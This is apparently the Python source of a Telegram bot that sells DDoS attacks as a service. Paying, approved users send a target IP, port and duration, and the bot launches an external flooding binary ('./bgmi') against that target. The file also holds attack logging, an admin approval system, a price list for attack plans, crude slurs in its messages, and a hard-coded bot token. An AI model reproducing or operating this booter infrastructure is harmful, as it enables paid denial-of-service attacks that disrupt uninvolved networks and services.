#!/usr/bin/python3
import telebot
import subprocess
import threading
import time
import os

# === CONFIGURATION ===
BOT_TOKEN = '7763849431:AAF0_eCqur_-Y3wES-g0lLb1l6UungzEyHQ'  # Replace with your actual bot token
bot = telebot.TeleBot(BOT_TOKEN)

admin_id = {"6240986259"}
EXEMPTED_USERS = [6240986259]
USER_FILE = "users1.txt"
LOG_FILE = "log1.txt"
COOLDOWN_TIME = 0
MAX_DURATION = 500

# === GLOBAL ===
user_cooldowns = {}
active_attacks = {}

# === HELPERS ===
def is_admin(user_id):
    return str(user_id) in admin_id

def is_approved(user_id):
    with open(USER_FILE, "a+") as f:
        f.seek(0)
        return str(user_id) in f.read()

def approve_user(user_id):
    with open(USER_FILE, "a+") as f:
        f.seek(0)
        if str(user_id) not in f.read():
            f.write(f"{user_id}\n")

def log_attack(user_id, ip, port, duration):
    with open(LOG_FILE, "a") as log:
        log.write(f"{user_id} | {ip}:{port} | {duration}s\n")

# === COMMANDS ===
@bot.message_handler(commands=['start'])
def start_cmd(msg):
    bot.reply_to(msg, '''
🌟 👑DDOS MARO 👑🌟
🔥>SAFE & SECURE DDOS GROUP< 🔐
"𝐓𝐫𝐮𝐒𝐭 𝐢𝐬 𝐌𝐲 𝐅𝐢𝐫𝐬𝐭 𝐏𝐫𝐢𝐨𝐫𝐢𝐭𝐲"
━━━━━━━━━✦━━━━━━━━━
┗❏ Owner = @bhanuxyz2 ┗❏

/start - open all commands
/maro - <IP> <PORT> <TIME> - Start an attack
/stop - Stop ongoing attack
/approve - Approve [user_id]
/viewusers - View all users
/plan - View all plans
''')

@bot.message_handler(commands=['maro'])
def hack_cmd(msg):
    user_id = msg.from_user.id
    args = msg.text.split()
    if len(args) != 4:
        return bot.reply_to(msg, "Usage: /maro <IP> <PORT> <TIME>")

    if not (is_admin(user_id) or is_approved(user_id)):
        return bot.reply_to(msg, '''
╔═══━━━─── • ───━━━═══╗
🔒 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗
╚═══━━━─── • ───━━━═══╝
🚫Ohhhhh! It seems like your Access Not Available to use the /hack command.
💎 Redeem a key to unlock attacks
Contact : @bhanuxyz2
''')

    ip, port, duration = args[1], args[2], int(args[3])
    if duration > MAX_DURATION:
        return bot.reply_to(msg, f"Max attack duration is {MAX_DURATION} seconds")

    if user_id in user_cooldowns and time.time() < user_cooldowns[user_id]:
        return bot.reply_to(msg, "Cooldown active. Try later.")

    user_cooldowns[user_id] = time.time() + COOLDOWN_TIME

    bot.send_message(msg.chat.id, f'''
╔════════════════════════╗
║    🚀 ATTACK LAUNCHED 🚀  ║
╚════════════════════════╝
📡 Target   : {ip}
🧠 IP       : {port}
⏱️ Time     : {duration} seconds
🚀 Status   : ATTACK STARTED
👑 User     : {user_id}
🧨 All PE MAA CHOD DE !
''')

    log_attack(user_id, ip, port, duration)

    proc = subprocess.Popen(["./bgmi", ip, port, str(duration)])
    active_attacks[user_id] = proc

    def end_attack():
        proc.wait()
        bot.send_message(msg.chat.id, f'''
╔════════════════════════╗
║    ✅ ATTACK COMPLETE ✅   ║
╚════════════════════════╝
📡 Target   : {ip}
🧠 IP       : {port}
⏱️ Time     : {duration} seconds
🚀 Status   : ATTACK COMPLETED
👑 User     : {user_id}
🧨 MAA CHOD DE SAB KI LAST PE !
''')
        active_attacks.pop(user_id, None)

    threading.Thread(target=end_attack).start()

@bot.message_handler(commands=['stop'])
def stop_cmd(msg):
    user_id = msg.from_user.id
    if user_id in active_attacks:
        active_attacks[user_id].terminate()
        bot.reply_to(msg, "Attack stopped.")
    else:
        bot.reply_to(msg, "No active attack found.")

@bot.message_handler(commands=['approve'])
def approve_cmd(msg):
    if not is_admin(msg.from_user.id):
        return bot.reply_to(msg, '''
╔═══━━━─── • ───━━━═══╗
🔒 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗
╚═══━━━─── • ───━━━═══╝
''')
    args = msg.text.split()
    if len(args) != 2:
        return bot.reply_to(msg, "Usage: /approve <user_id>")
    approve_user(args[1])
    bot.reply_to(msg, f"User {args[1]} approved.")

@bot.message_handler(commands=['viewusers'])
def viewusers_cmd(msg):
    if not is_admin(msg.from_user.id):
        return bot.reply_to(msg, '''
╔═══━━━─── • ───━━━═══╗
🔒 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗
╚═══━━━─── • ───━━━═══╝
''')
    with open(USER_FILE, "r") as f:
        users = f.read().strip()
    bot.reply_to(msg, f"Approved users:\n{users or 'None'}")

@bot.message_handler(commands=['plan'])
def plan_cmd(msg):
    bot.reply_to(msg, '''
😈😈 🔠🔠🔠 🔠🔠🔠 😈😈
PRICE LIST 👑
300s👿
✅1 DAYS =   120🔥
✅2 DAYS = 170🔥
✅3 DAYS = 219🔥
✅4 DAYS = 269🔥
✅5 DAYS = 329🔥
✅6 DAYS = 359🔥
✅7 DAYS = 399🔥
Unlimited attack💀
❤️1 DAYS VIP = 160 🔥
❤️2 DAYS VIP = 280 🔥
❤️3 DAYS VIP = 400 🔥
❤️7 DAYS VIP = 600 🔥
☑️BUY DM 👉 @bhanuxyz2
''')

# === BOT START ===
print("Bot is running...")
bot.infinity_polling()